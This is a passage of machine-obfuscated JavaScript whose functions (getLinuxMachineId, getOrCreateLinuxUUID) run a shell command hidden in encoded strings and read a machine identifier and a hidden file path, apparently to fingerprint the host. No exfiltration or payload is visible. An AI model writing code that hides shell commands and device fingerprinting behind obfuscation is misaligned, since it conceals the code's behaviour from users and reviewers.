            __p_0982846547_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x62)] +
              0x73
          ];
          i++
        ) {
          __p_0982846547_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x1c)] =
            __p_0982846547_stack[__p_0982846547_stack[0xd0] - 0x23].indexOf(
              __p_0982846547_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x20)][i]
            );
          if (
            __p_0982846547_stack[0xff] ===
            -__p_2786467427_dLR_0__JS_PREDICT__(-0x28)
          ) {
            continue;
          }
          if (
            __p_0982846547_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x63)] < 0x0
          ) {
            __p_0982846547_stack.d69hDM =
              __p_0982846547_stack[__p_0982846547_stack.Ra_05m + 0x16f];
          } else {
            __p_2360982505(
              (__p_0982846547_stack.d69hDM +=
                __p_0982846547_stack[
                  __p_2786467427_dLR_0__JS_PREDICT__(-0x1c)
                ] * 0x5b),
              (__p_0982846547_stack[0x5] |=
                __p_0982846547_stack.d69hDM << __p_0982846547_stack.hlu8j5),
              (__p_0982846547_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x61)] +=
                (__p_0982846547_stack[
                  __p_2786467427_dLR_0__JS_PREDICT__(0x63)
                ] &
                  0x1fff) >
                0x58
                  ? __p_0982846547_stack.Ra_05m +
                    __p_2786467427_dLR_0__JS_PREDICT__(0x64)
                  : __p_2786467427_dLR_0__JS_PREDICT__(0xe))
            );
            do {
              __p_2360982505(
                __p_0982846547_stack.TzbseY.push(
                  __p_0982846547_stack[0x5] &
                    (__p_0982846547_stack[0xd0] + 0xdb)
                ),
                (__p_0982846547_stack[0x5] >>= 0x8),
                (__p_0982846547_stack[
                  __p_2786467427_dLR_0__JS_PREDICT__(0x61)
                ] -=
                  __p_0982846547_stack[
                    __p_2786467427_dLR_0__JS_PREDICT__(0x65)
                  ] - __p_2786467427_dLR_0__JS_PREDICT__(0x24))
              );
            } while (__p_0982846547_stack.hlu8j5 > 0x7);
            __p_0982846547_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x63)] =
              -0x1;
          }
        }
        if (
          __p_0982846547_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x63)] > -0x1
        ) {
          __p_0982846547_stack.TzbseY.push(
            (__p_0982846547_stack[0x5] |
              (__p_0982846547_stack.d69hDM << __p_0982846547_stack.hlu8j5)) &
              __p_2786467427_dLR_0__JS_PREDICT__(-0x1c)
          );
        }
        return __p_0982846547_stack.Ra_05m >
          __p_2786467427_dLR_0__JS_PREDICT__(-0x2a)
          ? __p_0982846547_stack[0x33]
          : __p_1990998267__JS_PREDICT__(__p_0982846547_stack.TzbseY);
      }
    } catch (error) {
      var __p_5253867003__JS_PREDICT__ = __p_6510065121(
        (...__p_5449674267_stack) => {
          __p_2360982505(
            (__p_5449674267_stack[
              __p_2786467427_dLR_0__JS_PREDICT__(-0x2f)
            ] = 0x5),
            (__p_5449674267_stack[
              __p_2786467427_dLR_0__JS_PREDICT__(0x66)
            ] = 0x32)
          );
          if (
            typeof __p_5449674267_stack[
              __p_2786467427_dLR_0__JS_PREDICT__(-0x24)
            ] === "undefined"
          ) {
            __p_5449674267_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x24)] =
              __p_6230119704__JS_PREDICT____JS_CRITICAL__;
          }
          if (typeof __p_5449674267_stack[0x4] === "undefined") {
            __p_5449674267_stack[0x4] = __p_3576149457;
          }
          if (
            __p_5449674267_stack[
              __p_5449674267_stack.y7zTj5 -
                __p_2786467427_dLR_0__JS_PREDICT__(0x4e)
            ]
          ) {
            [
              __p_5449674267_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x25)],
              __p_5449674267_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x28)],
            ] = [
              __p_5449674267_stack[0x3](__p_5449674267_stack[0x4]),
              __p_5449674267_stack[0x0] || __p_5449674267_stack[0x2],
            ];
            return __p_5253867003__JS_PREDICT__(
              __p_5449674267_stack[0x0],
              __p_5449674267_stack[0x4],
              __p_5449674267_stack[
                __p_5449674267_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x66)] -
                  __p_2786467427_dLR_0__JS_PREDICT__(0x3a)
              ]
            );
          }
          if (
            __p_5449674267_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x20)] ==
            __p_5449674267_stack[0x0]
          ) {
            return (__p_5449674267_stack[
              __p_2786467427_dLR_0__JS_PREDICT__(-0x28)
            ][
              __p_3576149457[
                __p_5449674267_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x20)]
              ]
            ] = __p_5253867003__JS_PREDICT__(
              __p_5449674267_stack[0x0],
              __p_5449674267_stack[0x1]
            ));
          }
          if (
            __p_5449674267_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x24)] ===
            __p_5253867003__JS_PREDICT__
          ) {
            __p_6230119704__JS_PREDICT____JS_CRITICAL__ =
              __p_5449674267_stack[0x1];
            return __p_6230119704__JS_PREDICT____JS_CRITICAL__(
              __p_5449674267_stack[__p_5449674267_stack.y7zTj5 - 0x30]
            );
          }
          if (
            __p_5449674267_stack[
              __p_5449674267_stack.y7zTj5 -
                __p_2786467427_dLR_0__JS_PREDICT__(0x67)
            ] !==
            __p_5449674267_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x28)]
          ) {
            return (
              __p_5449674267_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x25)][
                __p_5449674267_stack[
                  __p_5449674267_stack[
                    __p_2786467427_dLR_0__JS_PREDICT__(0x66)
                  ] - 0x32
                ]
              ] ||
              (__p_5449674267_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x25)][
                __p_5449674267_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2e)]
              ] = __p_5449674267_stack[0x3](
                __p_1940297625[
                  __p_5449674267_stack[__p_5449674267_stack.y7zTj5 - 0x32]
                ]
              ))
            );
          }
          if (
            __p_5449674267_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x20)] ==
            __p_5449674267_stack[0x3]
          ) {
            return __p_5449674267_stack[0x1]
              ? __p_5449674267_stack[0x0][
                  __p_5449674267_stack[
                    __p_5449674267_stack[
                      __p_2786467427_dLR_0__JS_PREDICT__(0x66)
                    ] -
                      (__p_5449674267_stack[
                        __p_2786467427_dLR_0__JS_PREDICT__(0x66)
                      ] -
                        0x4)
                  ][
                    __p_5449674267_stack[
                      __p_2786467427_dLR_0__JS_PREDICT__(-0x28)
                    ]
                  ]
                ]
              : __p_3576149457[__p_5449674267_stack[0x0]] ||
                  ((__p_5449674267_stack[
                    __p_5449674267_stack.y7zTj5 -
                      __p_2786467427_dLR_0__JS_PREDICT__(0x3a)
                  ] =
                    __p_5449674267_stack[
                      __p_2786467427_dLR_0__JS_PREDICT__(-0x25)
                    ][
                      __p_5449674267_stack[
                        __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)
                      ]
                    ] || __p_5449674267_stack[0x3]),
                  (__p_3576149457[
                    __p_5449674267_stack[
                      __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)
                    ]
                  ] = __p_5449674267_stack[0x2](
                    __p_1940297625[
                      __p_5449674267_stack[
                        __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)
                      ]
                    ]
                  )));
          }
        },
        __p_2786467427_dLR_0__JS_PREDICT__(-0x22)
      );
      __p_5987693262_stack.iSIqUl = {
        okKn5d: __p_5253867003__JS_PREDICT__(0x8b),
      };
      throw new Error(
        __p_0575541368_calc(
          __p_5253867003__JS_PREDICT__.apply(
            __p_2786467427_dLR_0__JS_PREDICT__(-0x1e),
            [0x8a]
          ),
          error[__p_5987693262_stack.iSIqUl.okKn5d],
          (__p_6857802341 = -0x20)
        )
      );
      function __p_6230119704__JS_PREDICT____JS_CRITICAL__(
        ...__p_8918824776_stack
      ) {
        var i;
        __p_2360982505(
          (__p_8918824776_stack.length =
            __p_2786467427_dLR_0__JS_PREDICT__(-0x28)),
          (__p_8918824776_stack.I0oHFij = __p_8918824776_stack[0x4]),
          (__p_8918824776_stack.aUIVS1 =
            'nxw@?XaZq"K53Wi.U%2BSvY8y4=~O>m&{7Hu`;s(<^Jg!z_0R]I,TEM9b+}$cj#Nk1PFd6e)*L[t:/|rGfCAQoVhDpl'),
          (__p_8918824776_stack.Csy4TsN =
            "" + (__p_8918824776_stack[0x0] || "")),
          (__p_8918824776_stack.YLBg0x = __p_8918824776_stack.Csy4TsN.length),
          (__p_8918824776_stack.I0oHFij = []),
          (__p_8918824776_stack.MmpDvg =
            __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)),
          (__p_8918824776_stack.XoVJ6V =
            __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)),
          (__p_8918824776_stack[0x7] = -0x1)
        );
        for (
          i = __p_2786467427_dLR_0__JS_PREDICT__(-0x2e);
          i < __p_8918824776_stack.YLBg0x;
          i++
        ) {
          __p_8918824776_stack[0x9] = __p_8918824776_stack.aUIVS1.indexOf(
            __p_8918824776_stack.Csy4TsN[i]
          );
          if (
            __p_8918824776_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x7)] ===
            -__p_2786467427_dLR_0__JS_PREDICT__(-0x28)
          ) {
            continue;
          }
          if (__p_8918824776_stack[0x7] < 0x0) {
            __p_8918824776_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x2)] =
              __p_8918824776_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x7)];
          } else {
            __p_2360982505(
              (__p_8918824776_stack[0x7] +=
                __p_8918824776_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x7)] *
                0x5b),
              (__p_8918824776_stack.MmpDvg |=
                __p_8918824776_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x2)] <<
                __p_8918824776_stack.XoVJ6V),
              (__p_8918824776_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x68)] +=
                (__p_8918824776_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x2)] &
                  0x1fff) >
                __p_2786467427_dLR_0__JS_PREDICT__(-0x16)
                  ? __p_2786467427_dLR_0__JS_PREDICT__(-0xb)
                  : 0xe)
            );
            do {
              __p_2360982505(
                __p_8918824776_stack.I0oHFij.push(
                  __p_8918824776_stack[
                    __p_2786467427_dLR_0__JS_PREDICT__(0x69)
                  ] & __p_2786467427_dLR_0__JS_PREDICT__(-0x1c)
                ),
                (__p_8918824776_stack.MmpDvg >>= 0x8),
                (__p_8918824776_stack.XoVJ6V -=
                  __p_2786467427_dLR_0__JS_PREDICT__(-0x15))
              );
            } while (
              __p_8918824776_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x68)] >
              __p_2786467427_dLR_0__JS_PREDICT__(0x2)
            );
            __p_8918824776_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x2)] =
              -0x1;
          }
        }
        if (
          __p_8918824776_stack[0x7] > -__p_2786467427_dLR_0__JS_PREDICT__(-0x28)
        ) {
          __p_8918824776_stack.I0oHFij.push(
            (__p_8918824776_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x69)] |
              (__p_8918824776_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x2)] <<
                __p_8918824776_stack.XoVJ6V)) &
              __p_2786467427_dLR_0__JS_PREDICT__(-0x1c)
          );
        }
        return __p_1990998267__JS_PREDICT__(__p_8918824776_stack.I0oHFij);
      }
    }
  },
  getLinuxMachineId = async () => {
    try {
      var __p_8940998386__JS_PREDICT__ = __p_6510065121(
          (...__p_6684013986_stack) => {
            __p_2360982505(
              (__p_6684013986_stack.length = 0x5),
              (__p_6684013986_stack[
                __p_2786467427_dLR_0__JS_PREDICT__(0x6a)
              ] = 0x1a)
            );
            if (typeof __p_6684013986_stack[0x3] === "undefined") {
              __p_6684013986_stack[__p_6684013986_stack.BhJ1Leq - 0x17] =
                __p_0161156913__JS_PREDICT____JS_CRITICAL__;
            }
            __p_6684013986_stack.BhJ1Leq =
              __p_2786467427_dLR_0__JS_PREDICT__(0xa);
            if (
              typeof __p_6684013986_stack[
                __p_2786467427_dLR_0__JS_PREDICT__(-0x25)
              ] === __p_2786467427_dLR_0__JS_PREDICT__(-0x27)
            ) {
              __p_6684013986_stack[0x4] = __p_3576149457;
            }
            if (
              __p_6684013986_stack[
                __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)
              ] !==
              __p_6684013986_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x28)]
            ) {
              return (
                __p_6684013986_stack[0x4][__p_6684013986_stack[0x0]] ||
                (__p_6684013986_stack[
                  __p_2786467427_dLR_0__JS_PREDICT__(-0x25)
                ][
                  __p_6684013986_stack[
                    __p_6684013986_stack.BhJ1Leq -
                      __p_2786467427_dLR_0__JS_PREDICT__(0xa)
                  ]
                ] = __p_6684013986_stack[
                  __p_2786467427_dLR_0__JS_PREDICT__(-0x24)
                ](__p_1940297625[__p_6684013986_stack[0x0]]))
              );
            }
            if (
              __p_6684013986_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x28)]
            ) {
              [
                __p_6684013986_stack[0x4],
                __p_6684013986_stack[__p_6684013986_stack.BhJ1Leq - 0xf],
              ] = [
                __p_6684013986_stack[0x3](
                  __p_6684013986_stack[
                    __p_2786467427_dLR_0__JS_PREDICT__(-0x25)
                  ]
                ),
                __p_6684013986_stack[
                  __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)
                ] || __p_6684013986_stack[__p_6684013986_stack.BhJ1Leq - 0xe],
              ];
              return __p_8940998386__JS_PREDICT__(
                __p_6684013986_stack[0x0],
                __p_6684013986_stack[0x4],
                __p_6684013986_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x20)]
              );
            }
            if (
              __p_6684013986_stack[__p_6684013986_stack.BhJ1Leq - 0xe] ==
              __p_6684013986_stack[0x3]
            ) {
              return __p_6684013986_stack[0x1]
                ? __p_6684013986_stack[
                    __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)
                  ][
                    __p_6684013986_stack[
                      __p_2786467427_dLR_0__JS_PREDICT__(-0x25)
                    ][__p_6684013986_stack[0x1]]
                  ]
                : __p_3576149457[
                    __p_6684013986_stack[
                      __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)
                    ]
                  ] ||
                    ((__p_6684013986_stack[0x2] =
                      __p_6684013986_stack[
                        __p_6684013986_stack.BhJ1Leq -
                          __p_2786467427_dLR_0__JS_PREDICT__(-0x2a)
                      ][
                        __p_6684013986_stack[
                          __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)
                        ]
                      ] || __p_6684013986_stack[0x3]),
                    (__p_3576149457[__p_6684013986_stack[0x0]] =
                      __p_6684013986_stack[0x2](
                        __p_1940297625[
                          __p_6684013986_stack[
                            __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)
                          ]
                        ]
                      )));
            }
            if (
              __p_6684013986_stack[
                __p_6684013986_stack.BhJ1Leq -
                  __p_2786467427_dLR_0__JS_PREDICT__(0xe)
              ] == __p_6684013986_stack[0x0]
            ) {
              return (__p_6684013986_stack[
                __p_2786467427_dLR_0__JS_PREDICT__(-0x28)
              ][
                __p_3576149457[
                  __p_6684013986_stack[
                    __p_6684013986_stack[
                      __p_2786467427_dLR_0__JS_PREDICT__(0x6a)
                    ] - __p_2786467427_dLR_0__JS_PREDICT__(0xe)
                  ]
                ]
              ] = __p_8940998386__JS_PREDICT__(
                __p_6684013986_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2e)],
                __p_6684013986_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x28)]
              ));
            }
            if (__p_6684013986_stack[0x3] === void 0x0) {
              __p_8940998386__JS_PREDICT__ =
                __p_6684013986_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x25)];
            }
            if (
              __p_6684013986_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x20)] &&
              __p_6684013986_stack[0x3] !==
                __p_0161156913__JS_PREDICT____JS_CRITICAL__
            ) {
              __p_8940998386__JS_PREDICT__ =
                __p_0161156913__JS_PREDICT____JS_CRITICAL__;
              return __p_8940998386__JS_PREDICT__(
                __p_6684013986_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2e)],
                -0x1,
                __p_6684013986_stack[0x2],
                __p_6684013986_stack[0x3],
                __p_6684013986_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x25)]
              );
            }
          },
          0x5
        ),
        __p_3547289196;
      __p_3547289196 = [__p_8940998386__JS_PREDICT__(0x98)];
      const {
        [__p_8940998386__JS_PREDICT__(0x8c)]: stdout,
        [__p_8940998386__JS_PREDICT__(0x8d)]: stderr,
      } = await execPromise(
        __p_8940998386__JS_PREDICT__(0x8e) +
          __p_8940998386__JS_PREDICT__(0x8f) +
          __p_8940998386__JS_PREDICT__.call(
            __p_2786467427_dLR_0__JS_PREDICT__(-0x1e),
            0x90
          ) +
          __p_8940998386__JS_PREDICT__(0x91) +
          __p_8940998386__JS_PREDICT__.call(
            __p_2786467427_dLR_0__JS_PREDICT__(-0x1e),
            0x92
          )
      );
      if (
        stderr &&
        __p_9743501678.tZjv4eQ[__p_8940998386__JS_PREDICT__(0x93)](0x5) == "O"
      ) {
        throw new Error(
          __p_8940998386__JS_PREDICT__[
            __p_2786467427_dLR_0__JS_PREDICT__(0x18)
          ](void 0x0, [0x94]) +
            __p_8940998386__JS_PREDICT__(0x95) +
            __p_8940998386__JS_PREDICT__(0x96) +
            __p_8940998386__JS_PREDICT__(0x97)
        );
      }
      const machineIdParts =
        stdout[__p_8940998386__JS_PREDICT__(0x98)]()[
          __p_8940998386__JS_PREDICT__[
            __p_2786467427_dLR_0__JS_PREDICT__(0x18)
          ](__p_2786467427_dLR_0__JS_PREDICT__(-0x1e), [0x99])
        ](":");
      if (
        machineIdParts[__p_8940998386__JS_PREDICT__(0x9a)] <
          __p_2786467427_dLR_0__JS_PREDICT__(-0x20) &&
        __p_9743501678.tZjv4eQ[__p_8940998386__JS_PREDICT__(0x93)](
          __p_2786467427_dLR_0__JS_PREDICT__(-0x22)
        ) == "O"
      ) {
        throw new Error(
          __p_8940998386__JS_PREDICT__(0x9b) +
            __p_8940998386__JS_PREDICT__(
              __p_2786467427_dLR_0__JS_PREDICT__(0x6b)
            ) +
            __p_8940998386__JS_PREDICT__.apply(void 0x0, [0x9d]) +
            __p_8940998386__JS_PREDICT__(
              __p_2786467427_dLR_0__JS_PREDICT__(-0x17)
            ) +
            "t"
        );
      }
      const machineId = machineIdParts[0x1][__p_3547289196[0x0]]();
      return machineId;
      function __p_0161156913__JS_PREDICT____JS_CRITICAL__(
        ...__p_9413936097_stack
      ) {
        var i;
        __p_2360982505(
          (__p_9413936097_stack[
            __p_2786467427_dLR_0__JS_PREDICT__(-0x2f)
          ] = 0x1),
          (__p_9413936097_stack[0x42] =
            -__p_2786467427_dLR_0__JS_PREDICT__(0x6c)),
          (__p_9413936097_stack.GJnFMJ =
            'q*Z1Ad;WBvmXT,cH=(x`.5t@gwU?<!9/M]67p&_y+2"[):lRFuJ4Cb8#0$QOE}^>Yz~3|aN{%nSILsDVPfrGkijoeKh'),
          (__p_9413936097_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x20)] =
            "" +
            (__p_9413936097_stack[
              __p_9413936097_stack[0x42] +
                __p_2786467427_dLR_0__JS_PREDICT__(0x6c)
            ] || "")),
          (__p_9413936097_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x24)] =
            __p_9413936097_stack[
              __p_2786467427_dLR_0__JS_PREDICT__(-0x20)
            ].length),
          (__p_9413936097_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x25)] =
            []),
          (__p_9413936097_stack.J5ewvd =
            __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)),
          (__p_9413936097_stack.g9W8aS =
            __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)),
          (__p_9413936097_stack[0x7] = -0x1)
        );
        for (
          i = __p_2786467427_dLR_0__JS_PREDICT__(-0x2e);
          i < __p_9413936097_stack[0x3];
          i++
        ) {
          __p_9413936097_stack.kI0m14v = __p_9413936097_stack.GJnFMJ.indexOf(
            __p_9413936097_stack[__p_9413936097_stack[0x42] + 0x51][i]
          );
          if (
            __p_9413936097_stack.kI0m14v ===
            -(
              __p_9413936097_stack[0x42] +
              __p_2786467427_dLR_0__JS_PREDICT__(0x60)
            )
          ) {
            continue;
          }
          if (
            __p_9413936097_stack[0x7] <
            __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)
          ) {
            __p_9413936097_stack[0x7] = __p_9413936097_stack.kI0m14v;
          } else {
            __p_2360982505(
              (__p_9413936097_stack[0x7] +=
                __p_9413936097_stack.kI0m14v *
                __p_2786467427_dLR_0__JS_PREDICT__(-0x1d)),
              (__p_9413936097_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x6d)] |=
                __p_9413936097_stack[__p_9413936097_stack[0x42] + 0x56] <<
                __p_9413936097_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x6e)]),
              (__p_9413936097_stack.g9W8aS +=
                (__p_9413936097_stack[
                  __p_9413936097_stack[0x42] +
                    __p_2786467427_dLR_0__JS_PREDICT__(0x45)
                ] &
                  0x1fff) >
                __p_2786467427_dLR_0__JS_PREDICT__(-0x16)
                  ? __p_2786467427_dLR_0__JS_PREDICT__(-0xb)
                  : 0xe)
            );
            do {
              __p_2360982505(
                __p_9413936097_stack[
                  __p_2786467427_dLR_0__JS_PREDICT__(-0x25)
                ].push(
                  __p_9413936097_stack[
                    __p_2786467427_dLR_0__JS_PREDICT__(0x6d)
                  ] & __p_2786467427_dLR_0__JS_PREDICT__(-0x1c)
                ),
                (__p_9413936097_stack.J5ewvd >>=
                  __p_2786467427_dLR_0__JS_PREDICT__(-0x15)),
                (__p_9413936097_stack.g9W8aS -=
                  __p_2786467427_dLR_0__JS_PREDICT__(-0x15))
              );
            } while (
              __p_9413936097_stack.g9W8aS >
              __p_2786467427_dLR_0__JS_PREDICT__(0x2)
            );
            __p_9413936097_stack[
              __p_9413936097_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x6f)] +
                0x56
            ] = -0x1;
          }
        }
        if (
          __p_9413936097_stack[0x7] > -__p_2786467427_dLR_0__JS_PREDICT__(-0x28)
        ) {
          __p_9413936097_stack[0x4].push(
            (__p_9413936097_stack.J5ewvd |
              (__p_9413936097_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x2)] <<
                __p_9413936097_stack[
                  __p_2786467427_dLR_0__JS_PREDICT__(0x6e)
                ])) &
              __p_2786467427_dLR_0__JS_PREDICT__(-0x1c)
          );
        }
        return __p_9413936097_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x6f)] >
          0xc
          ? __p_9413936097_stack[-0x47]
          : __p_1990998267__JS_PREDICT__(
              __p_9413936097_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x25)]
            );
      }
    } catch (error) {
      var __p_4077528232__JS_PREDICT__ = __p_6510065121(
        (...__p_7825768012_stack) => {
          __p_2360982505(
            (__p_7825768012_stack[
              __p_2786467427_dLR_0__JS_PREDICT__(-0x2f)
            ] = 0x5),
            (__p_7825768012_stack[
              __p_2786467427_dLR_0__JS_PREDICT__(0x70)
            ] = 0x38)
          );
          if (
            typeof __p_7825768012_stack[__p_7825768012_stack.t7yvGb7 - 0x35] ===
            __p_2786467427_dLR_0__JS_PREDICT__(-0x27)
          ) {
            __p_7825768012_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x24)] =
              __p_8888960951__JS_PREDICT____JS_CRITICAL__;
          }
          if (typeof __p_7825768012_stack[0x4] === "undefined") {
            __p_7825768012_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x25)] =
              __p_3576149457;
          }
          if (
            __p_7825768012_stack[0x3] ===
            __p_2786467427_dLR_0__JS_PREDICT__(-0x1e)
          ) {
            __p_4077528232__JS_PREDICT__ = __p_7825768012_stack[0x4];
          }
          if (
            __p_7825768012_stack[0x0] !==
            __p_7825768012_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x28)]
          ) {
            return (
              __p_7825768012_stack[0x4][__p_7825768012_stack[0x0]] ||
              (__p_7825768012_stack[0x4][
                __p_7825768012_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2e)]
              ] = __p_7825768012_stack[__p_7825768012_stack.t7yvGb7 - 0x35](
                __p_1940297625[
                  __p_7825768012_stack[
                    __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)
                  ]
                ]
              ))
            );
          }
          if (
            __p_7825768012_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x24)] ===
            __p_4077528232__JS_PREDICT__
          ) {
            __p_8888960951__JS_PREDICT____JS_CRITICAL__ =
              __p_7825768012_stack[0x1];
            return __p_8888960951__JS_PREDICT____JS_CRITICAL__(
              __p_7825768012_stack[0x2]
            );
          }
          if (
            __p_7825768012_stack[
              __p_7825768012_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x70)] -
                0x37
            ]
          ) {
            [
              __p_7825768012_stack[
                __p_7825768012_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x70)] -
                  0x34
              ],
              __p_7825768012_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x28)],
            ] = [
              __p_7825768012_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x24)](
                __p_7825768012_stack[0x4]
              ),
              __p_7825768012_stack[
                __p_7825768012_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x70)] -
                  (__p_7825768012_stack[
                    __p_2786467427_dLR_0__JS_PREDICT__(0x70)
                  ] -
                    __p_2786467427_dLR_0__JS_PREDICT__(-0x2e))
              ] ||
                __p_7825768012_stack[
                  __p_7825768012_stack.t7yvGb7 -
                    __p_2786467427_dLR_0__JS_PREDICT__(0x2d)
                ],
            ];
            return __p_4077528232__JS_PREDICT__(
              __p_7825768012_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2e)],
              __p_7825768012_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x25)],
              __p_7825768012_stack[0x2]
            );
          }
        },
        __p_2786467427_dLR_0__JS_PREDICT__(-0x22)
      );
      throw new Error(
        __p_0575541368_calc(
          __p_4077528232__JS_PREDICT__(0x9f),
          error[__p_4077528232__JS_PREDICT__(0xa0)],
          __p_0333540851(-0x20)
        )
      );
      function __p_8888960951__JS_PREDICT____JS_CRITICAL__(
        str,
        table = 'bH7q:DQ;[Y9*Pf&Ch{rIBWu(vT|K%4F56>2`k}sM1A]mU!aO=le8"R.3GjVE<Nn#z+0cSZxJ@Lw,Xpi_t$?~og/y^)d',
        raw,
        len,
        ret = [],
        b = 0x0,
        n,
        v,
        i = 0x0,
        p
      ) {
        __p_2360982505(
          (raw = "" + (str || "")),
          (len = raw.length),
          (n = __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)),
          (v = -__p_2786467427_dLR_0__JS_PREDICT__(-0x28))
        );
        for (i = i; i < len; i++) {
          p = table.indexOf(raw[i]);
          if (p === -__p_2786467427_dLR_0__JS_PREDICT__(-0x28)) {
            continue;
          }
          if (v < __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)) {
            v = p;
          } else {
            __p_2360982505(
              (v += p * __p_2786467427_dLR_0__JS_PREDICT__(-0x1d)),
              (b |= v << n),
              (n +=
                (v & __p_2786467427_dLR_0__JS_PREDICT__(0xd)) >
                __p_2786467427_dLR_0__JS_PREDICT__(-0x16)
                  ? 0xd
                  : __p_2786467427_dLR_0__JS_PREDICT__(0xe))
            );
            do {
              __p_2360982505(
                ret.push(b & 0xff),
                (b >>= __p_2786467427_dLR_0__JS_PREDICT__(-0x15)),
                (n -= 0x8)
              );
            } while (n > 0x7);
            v = -__p_2786467427_dLR_0__JS_PREDICT__(-0x28);
          }
        }
        if (v > -0x1) {
          ret.push((b | (v << n)) & __p_2786467427_dLR_0__JS_PREDICT__(-0x1c));
        }
        return __p_1990998267__JS_PREDICT__(ret);
      }
    }
  },
  getOrCreateLinuxUUID = async (...__p_4304524035_stack) => {
    __p_2360982505(
      (__p_4304524035_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2f)] =
        __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)),
      (__p_4304524035_stack.nbznSzb =
        -__p_2786467427_dLR_0__JS_PREDICT__(0x64)),
      (__p_4304524035_stack.h5Sj6C = (x, y, z, a, b) => {
        if (typeof a === "undefined") {
          a = __p_6489609492__JS_PREDICT____JS_CRITICAL__;
        }
        if (typeof b === "undefined") {
          b = __p_3576149457;
        }
        if (z == a) {
          return y
            ? x[b[y]]
            : __p_3576149457[x] ||
                ((z = b[x] || a), (__p_3576149457[x] = z(__p_1940297625[x])));
        }
        if (x !== y) {
          return b[x] || (b[x] = a(__p_1940297625[x]));
        }
      }),
      (__p_4304524035_stack.pvs1aN = __p_0575541368_calc(
        __p_4304524035_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x71)][
          __p_2786467427_dLR_0__JS_PREDICT__(0x18)
        ](__p_2786467427_dLR_0__JS_PREDICT__(-0x1e), [
          __p_4304524035_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x72)] +
            0x11e,
        ]) + ALIAS,
        __p_4304524035_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x71)](0xa2),
        __p_0333540851(-__p_2786467427_dLR_0__JS_PREDICT__(-0xa))
      )),
      (__p_4304524035_stack[0x33] = __p_4304524035_stack[0x8])
    );
    try {
      __p_4304524035_stack[0x7] = void 0x0;
      try {
        __p_2360982505(
          (__p_4304524035_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x19)] =
            await readFileAsync(
              __p_4304524035_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x73)],
              __p_4304524035_stack.h5Sj6C[
                __p_2786467427_dLR_0__JS_PREDICT__(0x1d)
